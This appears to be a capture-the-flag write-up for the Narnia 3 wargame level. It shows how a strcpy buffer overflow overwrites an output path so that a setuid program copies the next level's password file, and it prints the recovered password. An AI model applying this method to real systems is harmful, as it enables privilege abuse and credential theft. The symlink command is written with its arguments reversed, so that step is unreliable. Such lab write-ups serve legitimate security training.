# **LET'S START OUR NARNIA 3**
-------------------------------

As always let's start by reading our code!
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

As the previous one i'm pretty sure that i'll have to do a buffer overflow, our data is directly send to /dev/null so don't focus on that part of the code because it would be really tricky to change this path
But, the size check is where we have a break

After I analyze the code,we see that strcpy take the first arg and copy to ifile with a limit of 32bytes
(so our file has to be > 32bytes if we want to overflow it!)
I don't want to bother myself with a file, so the folder length would normally be enough to fulfill 32bytes
(32bytes is really small so the text of our dir name would be enough)
i'll go under /tmp (I'm not on my machine and I know that i've write access in tmp) and create a 27 char length folder
```bash
narnia3@narnia:/narnia$ mkdir `python -c 'print "/tmp/"+"R"*27'`
narnia3@narnia:/narnia$ cd `python -c 'print "/tmp/"+"R"*27'`
narnia3@narnia:/tmp/RRRRRRRRRRRRRRRRRRRRRRRRRRR /narnia/narnia3 $(pwd)
	error opening 
```

PERFECT it does work and effectively our folder made ./narnia3 crash

### What are you trying to do so??
What i want to do is override the default ofile value by one of my choice so i can acceed it
I just have to push my data to the max and so it will execute it AND print it where i want

Basically what i've done is adding a tmp at the end of my RRR.. folder and a file called out 
this out file is a link to my narnia4 pass!!
so let's just use this command:
```bash
ln -s out /etc/narnia_pass/narnia4
```

so, to explain
this whole path is taken as the file i need to copy
/tmp/RRRRRRRRRRRRRRRRRRRRRRRRRRR/tmp/out

And because my /tmp/RR.. is too long, it basically take all the memory
And this /tmp/out do overide the default /dev/null 

So now, this wonderful override made that the file out who's a link, is directly send into /tmp/out
So if i've already create a file called "out" with writting permission (touch /tmp/out; chmod 777 /tmp/out;)
So i'll have my result printed in this file in /tmp/out
Let's test this!

```bash
narnia3@narnia:/tmp/RRRRRRRRRRRRRRRRRRRRRRRRRRR/tmp$ /narnia/narnia3 /tmp/RRRRRRRRRRRRRRRRRRRRRRRRRRR/tmp/out
copied contents of /tmp/RRRRRRRRRRRRRRRRRRRRRRRRRRR/tmp/out to a safer place... (/tmp/out)
```
ALRIGHT IT DOES WORKED!!
let's check it out in our file:
thaenohtai

well done!!! Let's jump into the next one